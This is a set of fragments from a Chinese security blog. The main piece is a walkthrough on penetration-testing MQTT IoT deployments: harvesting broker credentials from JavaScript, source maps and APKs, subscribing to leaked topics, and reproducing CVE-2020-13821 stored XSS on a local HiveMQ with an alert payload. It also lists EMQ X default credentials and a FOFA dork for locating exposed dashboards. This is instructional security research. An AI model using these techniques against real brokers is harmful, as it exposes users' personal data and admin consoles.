&lt;li&gt;Burp Suite&lt;/li&gt;
&lt;li&gt;source detecotor&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;好了，有了这几个就够了。开始我们的实战之旅。&lt;/p&gt;
&lt;h3 id=&#34;获取方法&#34;&gt;&lt;strong&gt;获取方法&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;web应用中直接捕获&lt;/strong&gt;&lt;br&gt;
在浏览目标时我一般会打开Chrome浏览器的开发者调试工具，通过查看请求信息或这直接搜索mqtt的字样来确定是否使用MQTT的javascript文件。另外一个就是可以查看websockets请求看是否有进行mqtt的连接操作等。&lt;/p&gt;
&lt;p&gt;一旦发现使用MQTT后，就可以继续查看javascript文件来找到连接的host、端口、用户名以及密码信息。对于目前流行的云厂商，一般还会开启tls。或者这些信息后，我们就可以进行深入的分析或利用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967556371.png&#34; alt=&#34;web应用中获取&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;除此之外，我也喜欢开启Brup suite记录通信流量，而且Brup suite支持websockets的记录。通过对历史记录的搜索功能可以快速发现MQTT相关内容。也可以根据个人习惯来快速确定。值得一提的是，一些内容在访问主页时就可以发现，有一些则会在一些其他页面，对于一些比较多的页面，可以使用爬虫的方式来提高效率，如通过headless的方式或者使用一些开源的2.0爬虫也可以。所有爬虫的流量经过Burp suite即可。对于流量比较大的，可以使用burp的loggeer++插件将流量记录到elasticsearch中。当然这里使用其他的代理也可以，如mitmproxy、goproxy等。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967583808.png&#34; alt=&#34;burpsuite获取mqtt信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;除此之外，还可以通过分析javascript文件中的连接信息，进行批量爬取来发现mqtt信息。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;通过.map文件获取源代码来获取&lt;/strong&gt;&lt;br&gt;
在实际的过程中可能会遇到只有一个登录页面，登录页面只有引用mqtt库的js文件，并没有发起请求。爬虫也无法访问到页面时怎么办呢？目前的许多网站喜欢使用webpack打包javascript文件，其中包括了vue开发的站点。在这种情况时，可以试试是否存在.map文件，一旦在实战中探测到这类文件，那么就可以下载目标网站的javascript的源代码文件。这里我比较喜欢使用source detecotor来实现。关于source detecotor的安装与使用可以看&lt;a href=&#34;https://bacde.me/post/unpack-webpack-via-sourcemap/&#34;&gt;https://bacde.me/post/unpack-webpack-via-sourcemap/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下图是通过下载源代码来发现其中的配置信息。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967607269.png&#34; alt=&#34;通过源代码获取mqtt信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;爆破js文件，从js文件中获取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在上述方法都失效的情况下，还可以通过爆破js文件的路径来尝试获取信息。观察目标的js存放路径，结合常见的js文件路径生成字典进行探测。&lt;/p&gt;
&lt;p&gt;这里列举几个常见js文件名，大家可以收集自己的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mqtt.js&lt;/li&gt;
&lt;li&gt;config.js&lt;/li&gt;
&lt;li&gt;main.js&lt;/li&gt;
&lt;li&gt;mqtt.class.js&lt;/li&gt;
&lt;li&gt;app.js&lt;/li&gt;
&lt;li&gt;env.js&lt;/li&gt;
&lt;li&gt;default.js&lt;/li&gt;
&lt;li&gt;index.js&lt;/li&gt;
&lt;li&gt;url.js&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以多试试，或许有意想不到的效果。可以看看如下两个例子：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967628546.png&#34; alt=&#34;爆破js文件1&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967641825.png&#34; alt=&#34;爆破js文件2&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;android应用各种获取配置信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;除web端之外,移动端可以通过反编译apk源代码搜索mqtt等关键字、查看xml配置文件来发现。除此之外，在研究中发现一些车企的移动端也使用了MQTT，但是他们将内容放在了so文件中，由于时间关系，本次还没来得及对其进行深入的分析。&lt;/p&gt;
&lt;p&gt;以下这个例子就是反编译app源码后，发现嵌入了一些页面文件，其中可以看到mqtt的配置信息。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967653590.png&#34; alt=&#34;android反编译源码获取mqtt信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;一些关键字&lt;/strong&gt;&lt;br&gt;
paho-mqtt/1.0.1/mqttws31.min.js&lt;br&gt;
paho-mqtt.js&lt;br&gt;
mqtt.aliyuncs.com&lt;br&gt;
mqtt.js&lt;/p&gt;
&lt;p&gt;iotdevicegateway&lt;/p&gt;
&lt;p&gt;一旦发现上述内容，基本上可以确定使用了mqtt。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0x01-连接mqtt&#34;&gt;0x01 连接MQTT&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;连接发现的mqtt&lt;/strong&gt;&lt;br&gt;
web端中的mqtt一般通过websockets进行连接，使用mqtt-pwn是无法连接成功的。这里可以通过websockets的客户端进行连接。将发现的mqtt内容填写如工具中即可进行连接。连接成功后可以发布和订阅内容，订阅的topic一般也写在代码中。&lt;br&gt;
推荐一个在线工具&lt;a href=&#34;http://tools.emqx.io/&#34;&gt;http://tools.emqx.io/&lt;/a&gt;。界面如下图：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967682085.png&#34; alt=&#34;emqx连接mqtt&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;带来的风险&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;获取了这些信息除了跟web代码中的存在什么样的安全问题呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;敏感信息泄漏&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在实际的研究过程中可以发现，通过获取的信息连接后，我们可以查看到其他用户的信息，其中会包含敏感信息。这就导致了敏感信息泄漏。下图中的系统使用了阿里云的MQTT，由于泄漏了mqtt配置信息，通过连接并订阅topic，可以看到泄漏了不该我们应该看到的信息，如用户手机号码、昵称、以及管理员与用户对话内容。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967703581.png&#34; alt=&#34;mqtt敏感信息泄露&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;发布恶意内容的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;连接成功后我们可以直接发布消息到队列中，这里我们可以直接绕过web端的防御，通过fuzz构造恶意的数据，比如植入xss攻击代码来实现攻击web端或移动端的用户。&lt;/p&gt;
&lt;p&gt;另外，网络上公开的一些管理平台同样因为过滤不严，导致存在xss。这可以使我们直接攻击管理员。这里介绍两个漏洞，CVE-2020-13821和CVE-2020-13932。编号CVE-2020-13821漏洞的产品是HiveMQ Broker management console中，攻击者可以通过恶意的clientid来攻击admin的控制台；编号CVE-2020-13932漏洞的产品是Apache ActiveMQ Artemis,攻击者可通过构造恶意的clientid或topics名字来攻击admin的控制台。&lt;/p&gt;
&lt;p&gt;这里测试CVE-2020-13821漏洞，该漏洞在hivemq4.4.0版本中已经修复，本地搭建的版本为hivemq 4.3.2。&lt;/p&gt;
&lt;p&gt;docker命令：&lt;code&gt;docker run -p 8080:8080 -p 1883:1883 hivemq/hivemq4:4.3.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;以上映射的端口可以自己定义，我这里环境使用的是8990和2883。docker启动后，即可打开&lt;code&gt;http://127.0.0.1:8990&lt;/code&gt; （可改为自己的端口，默认是8080），用户名和密码为admin和hivemq。&lt;/p&gt;
&lt;p&gt;我们可以使用mqttfx进行连接，在clientid中加入xss payload &lt;code&gt;&amp;lt;img/src=x onerror=alert(1)&amp;gt;&lt;/code&gt;，ip和端口填入自己环境或目标信息，点击连接即可，当然在实战中如果需要用户名和密码，填入即可。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967729552.png&#34; alt=&#34;mqtt管理平台xss&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;回到hivemq的管理平台，点击&lt;code&gt;clients&lt;/code&gt;菜单，点击&lt;code&gt;Refresh Snaphot&lt;/code&gt;即可触发执行payload，这就是一个存储型的XSS。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967746199.png&#34; alt=&#34;mqtt管理平台xss&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;可获取其他更多信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过连接上mqtt，可以尝试枚举其他topic的，来后去更多的内容，以此来检查是否存在更加敏感的信息，如gps位置、用户数据等。这里推荐一个工具mqttfx，跨平台软件。下面举一个例子。&lt;/p&gt;
&lt;p&gt;首先从web页面中获取到相关信息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967765471.png&#34; alt=&#34;获取更多信息&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;接下来可以获取web扫描全部端口或nmap来识别mqtt协议。找到mqtt端口。通常端口都为默认的1883。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967784837.png&#34; alt=&#34;nmap扫描mqtt端口&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;可以通过获取的连接信息来添加到软件中或者使用mqtt-pwn进行操作，下图为使用mqttfx进行连接。接下来可以尝试后去更多信息来进行渗透。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967811498.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967826205.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;也可以使用mqtt-pwn进行连接，mqtt-pwn列出了系统的topics。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967833467.png&#34; alt=&#34;mqtt-pwn 连接mqtt获取topics&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x02-mqtt管理平台&#34;&gt;0x02 MQTT管理平台&lt;/h2&gt;
&lt;p&gt;对于MQTT应用之外，还可以关注管理平台。目前EMQ X是其中比较流行的一个 。&lt;/p&gt;
&lt;p&gt;EMQ X全称 Erlang/Enterprise/Elastic MQTT Broker，它是基于 Erlang/OTP 语言平台开发，支持大规模连接和分布式集群，发布订阅模式的百万级开源 MQTT 消息服务器。EMQ X常见端口和默认密码为：&lt;/p&gt;
&lt;p&gt;TCP 端口： 1883&lt;/p&gt;
&lt;p&gt;Websocket 端口： 8083&lt;/p&gt;
&lt;p&gt;TCP/TLS 端口： 8883&lt;/p&gt;
&lt;p&gt;Websocket/TLS 端口： 8084&lt;/p&gt;
&lt;p&gt;管理平台端口：18083&lt;/p&gt;
&lt;p&gt;默认用户名密码：admin/public&lt;/p&gt;
&lt;p&gt;FOFA Dork：(port=&amp;quot;18083&amp;quot;&amp;amp;&amp;amp;title=&amp;quot;dashboard&amp;quot;) || body=&amp;quot;href=/static/emq.ico&amp;quot;&lt;/p&gt;
&lt;p&gt;通过登录平台，可以很方便的看到客户端连接、主题、订阅信息等，还可以通过添加规则来过滤数据。本地搭建的效果如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1599967862299.png&#34; alt=&#34;管理平台默认口令&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;除此之外rabbitmq、hivemq等也都有管理的平台，这里可以参考网络上的内容即可，这里不做赘述。&lt;/p&gt;
&lt;h2 id=&#34;0x03-总结&#34;&gt;0x03 总结&lt;/h2&gt;
&lt;p&gt;本文主要研究在实际的应用中如何获取mqtt信息，以及获取的信息带来的潜在风险。MQTT方面的安全还有很多内容等待着我们去挖掘。我也在研究中，希望以此抛砖引玉，能够更多的大佬一起交流和研究。&lt;/p&gt;
&lt;p&gt;最后的重点，建议搭建本地搭建环境或者在授权情况下进行测试，不要对外网目标进行非法测试和破坏。否则造成的一切后果与本人无关。&lt;/p&gt;
&lt;h2 id=&#34;0x04-引用&#34;&gt;0x04 引用&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&#34;&gt;https://docs.aws.amazon.com/iot/latest/developerguide/mqtt-ws.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&#34;&gt;https://www.hivemq.com/blog/mqtt-over-websockets-with-hivemq/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&#34;&gt;https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://tools.emqx.io/&#34;&gt;http://tools.emqx.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bacde.me/post/unpack-webpack-via-sourcemap/&#34;&gt;https://bacde.me/post/unpack-webpack-via-sourcemap/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://payatu.com/advisory/hivemq-mqtt-broker---xss-over-mqtt&#34;&gt;https://payatu.com/advisory/hivemq-mqtt-broker---xss-over-mqtt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-13932&#34;&gt;https://nvd.nist.gov/vuln/detail/CVE-2020-13932&lt;/a&gt;&lt;/p&gt;
">物联网安全之MQTT渗透实战</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/my-some-vulnerability-alert/"" data-c="
          &lt;p&gt;前几年做的一些漏洞分析复现或预警的文章，后来做管理岗，仅对感兴趣的漏洞做分析，写文写的少了。今天整理了下，存个档。&lt;br&gt;
注：由于国家政策限制，有一些只对外发了预警，详细的版本均发送给了监管机构。有一些访问404的是因为不方便公开细节。对于0day申请了cve编号，详情都发在sec-list。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1543.html&#34;&gt;【漏洞预警】pixie 在线图片编辑器全版本存在SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1555.html&#34;&gt;【漏洞预警】Onethink 全版本SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1542.html&#34;&gt;【漏洞预警】Struts2 最新命令执行漏洞S2-052[最新更新，PoC,漏洞绕过]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1544.html&#34;&gt;Cockpit CMS SSRF漏洞 0day&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1545.html&#34;&gt;TPSHOP 多用户商城系统任意文件读取&amp;amp;&amp;amp;SSRF 0day&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1559.html&#34;&gt;【漏洞预警】Metinfo 5.3.5- 5.3.13 SSRF漏洞[0day]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1517.html&#34;&gt;【漏洞预警】Metinfo 5.x.x版本 SQL注入漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1384.html&#34;&gt;威胁情报预警：Elasticsearch勒索软件事件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1389.html&#34;&gt;威胁情报预警：Couchdb勒索事件&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- more --&gt;
&lt;ol start=&#34;10&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1520.html&#34;&gt;【漏洞预警】D-link 850L等一系列产品存在多处漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1485.html&#34;&gt;【漏洞预警】浙江大华摄像存在0day后门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1489.html&#34;&gt;【漏洞预警】Apache Struts2 远程代码执行漏洞S2-046&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1493.html&#34;&gt;【漏洞预警】IIS 6.0 远程代码执行0day&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1494.html&#34;&gt;【漏洞预警】PHPCMSV9_Getshell漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1497.html&#34;&gt;【漏洞预警】Jenkins未验证代码执行_CVE-2017-1000353&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1498.html&#34;&gt;【高危漏洞预警】Wordpress Core 远程代码执行0day（无需验证和插件）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1499.html&#34;&gt;【漏洞预警】Wordpress 全版本密码重置0day漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;[【漏洞预警】Samba远程代码执行漏洞][(ttps://nosec.org/home/detail/1502.html)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1460.html&#34;&gt;【漏洞预警】Node.js 反序列化漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1475.html&#34;&gt;【漏洞预警】Wordpress NextGEN注入漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/2725.html&#34;&gt;【漏洞预警】致远OA 0day 漏洞预警&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1926.html&#34;&gt;【漏洞预警】Mini_httpd组件可能漏洞影响257万IOT设备（CVE-2018-18778）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/2491.html&#34;&gt;【威胁预警】iSCSI未授权访问漏洞，数万iSCSI可能受影响&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/2709.html&#34;&gt;【漏洞预警】Coremail配置信息泄露漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1748.html&#34;&gt;13万Mikrotik设备被植入挖矿代码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1755.html&#34;&gt;【漏洞预警】Struts2最新RCE漏洞S2-057（CVE-2018-11776）-带POC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1705.html&#34;&gt;【漏洞预警】Weblogic最新远程命令执行漏洞（CVE-2018-2894&amp;amp;CVE-2018-2893）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1610.html&#34;&gt;【漏洞预警】GPON光纤路由器越权和远程命令执行漏洞（CVE-2018-10561 &amp;amp; CVE-2018-10562）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1616.html&#34;&gt;【漏洞预警】DrayTek公司多个型号路由器产品最新的0day漏洞，漏洞影响可能影响110万设备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1621.html&#34;&gt;蚂蚁矿机多款型号存在远程命令执行漏洞（CVE-2018-11220）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1608.html&#34;&gt;【漏洞预警】Weblogic反序列化命令执行漏洞_CVE-2018-2628&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1605.html&#34;&gt;【事件分析】Cisco Smart Install安全漏洞&amp;amp;&amp;amp;远程代码执行漏洞【CVE-2018-0171】&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1606.html&#34;&gt;【漏洞预警】CVE-2018-1273 Spring Data Commons 远程代码执行漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1604.html&#34;&gt;【威胁预警】Weblogic wsl-wsat远程代码执行漏洞进行挖矿&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1583.html&#34;&gt;【漏洞预警】雄迈uc-httpd Web服务应用任意文件读取漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1541.html&#34;&gt;【漏洞预警】多款无线AP设备存在任意文件读取漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1495.html&#34;&gt;Shadow Brokers公布NSA黑客工具_包含众多Windows 0day漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1497.html&#34;&gt;【漏洞预警】Jenkins未验证代码执行_CVE-2017-1000353&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1367.html&#34;&gt;Jmoola! cms core最新任意文件上传漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1380.html&#34;&gt;PhpMailer存在远程代码执行漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1381.html&#34;&gt;【漏洞预警】PhpMailer存在任意代码执行漏洞补丁绕过(0day)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1397.html&#34;&gt;【漏洞预警】Wordpress 内容注入漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nosec.org/home/detail/1617.html&#34;&gt;【威胁预警】Redis挖矿病毒预警&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
">自己的一些漏洞分析文章汇总【含0day】</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/mqtt-security-part-one/"" data-c="
          &lt;p&gt;MQTT 全称为 Message Queuing Telemetry Transport（消息队列遥测传输）是是ISO 标准(ISO/IEC PRF 20922)下基于发布/订阅范式的消息协议，由 IBM 发布。由于其轻量、简单、开放和易于实现的特点非常适合需要低功耗和网络带宽有限的IoT场景。比如遥感数据、汽车、智能家居、智慧城市、医疗医护等。&lt;/p&gt;
&lt;h2 id=&#34;mqtt协议&#34;&gt;MQTT协议&lt;/h2&gt;
&lt;p&gt;MQTT协议为大量计算能力有限，低带宽、不可靠网络等环境而设计，其应用非常广泛。目前支持的服务端程序也较丰富，其PHP，JAVA，Python，C，C#等系统语言也都可以向MQTT发送相关消息。 目前最新的版本为5.0版本，可以在https://github.com/mqtt/mqtt.github.io/wiki/servers   这个连接中看到支持MQTT的服务端软件。 其中hivemq中提到针对汽车厂商的合作与应用，在研究过程中会发现有汽车行业应用了MQTT协议。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://p1.ssl.qhimg.com/t01f74a80563218bc7a.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;以下列举我们关心的几项：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用发布/订阅的消息模式，支持一对多的消息发布；&lt;/li&gt;
&lt;li&gt;消息是通过TCP/IP协议传输；&lt;/li&gt;
&lt;li&gt;简单的数据包格式；&lt;/li&gt;
&lt;li&gt;默认端口为TCP的1883，websocket端口8083，默认消息不加密。8883端口默认是通过TLS加密的MQTT协议。&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- more --&gt;
&lt;h3 id=&#34;发布订阅模式&#34;&gt;发布/订阅模式&lt;/h3&gt;
&lt;p&gt;MQTT协议中有三种角色和一个主要概念，三种角色分别是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER），还有一个主要的概念为主题（TOPIC）。&lt;/p&gt;
&lt;p&gt;消息的发送方被称为发布者，消息的接收方被称为订阅者，发送者和订阅者发布或订阅消息均会连接BROKER，BROKER一般为服务端，BROKER存放消息的容器就是主题。发布者将消息发送到主题中，订阅者在接收消息之前需要先“订阅主题”。每份订阅中，订阅者都可以接收到主题的所有消息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01b3844d8b306b3f7c.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;其MQTT协议流程图如下： &lt;img src=&#34;https://p1.ssl.qhimg.com/t01c8644cc806e6316e.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里不对协议进行过多介绍，感兴趣的大家可以结尾处的引用查看。&lt;/p&gt;
&lt;h2 id=&#34;mqtt的攻击点&#34;&gt;MQTT的攻击点&lt;/h2&gt;
&lt;p&gt;根据其特性，可以扩展如下几个攻击点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;授权：匿名连接问题，匿名访问则代表任何人都可以发布或订阅消息。如果存在敏感数据或指令，将导致信息泄漏或者被恶意攻击者发起恶意指令；&lt;/li&gt;
&lt;li&gt;传输：默认未加密，则可被中间人攻击。可获取其验证的用户名和密码；&lt;/li&gt;
&lt;li&gt;认证：弱口令问题，由于可被爆破，设置了弱口令，同样也会存在安全风险；&lt;/li&gt;
&lt;li&gt;应用：订阅端明文配置导致泄漏其验证的用户名和密码；&lt;/li&gt;
&lt;li&gt;漏洞：服务端软件自身存在缺陷可被利用，或者订阅端或服务端解析内容不当产生安全漏洞，这将导致整个系统。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mqtt的利用&#34;&gt;MQTT的利用&lt;/h3&gt;
&lt;p&gt;目前已经有针对MQTT的开源利用工具，这里主要以mqtt-pwn这块工具为主。mqtt-pwn这块工具功能强大易用。github地址为&lt;a href=&#34;https://github.com/akamai-threat-research/mqtt-pwn&#34;&gt;https://github.com/akamai-threat-research/mqtt-pwn&lt;/a&gt;，使用文档地址为&lt;a href=&#34;https://mqtt-pwn.readthedocs.io/en/latest/&#34;&gt;https://mqtt-pwn.readthedocs.io/en/latest/&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;工具安装&lt;/strong&gt;&lt;br&gt;
mqtt-pwn的安装很简单。可以直接安装到本机，也可以直接使用docker的方式。&lt;br&gt;
文本直接使用docker方式。首先确保已经安装docker和docker-compose。然后运行如下命令进行安装:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/akamai-threat-research/mqtt-pwn.git
cd mqtt-pwn
docker-compose up --build --detach
&lt;/code&gt;&lt;/pre&gt;
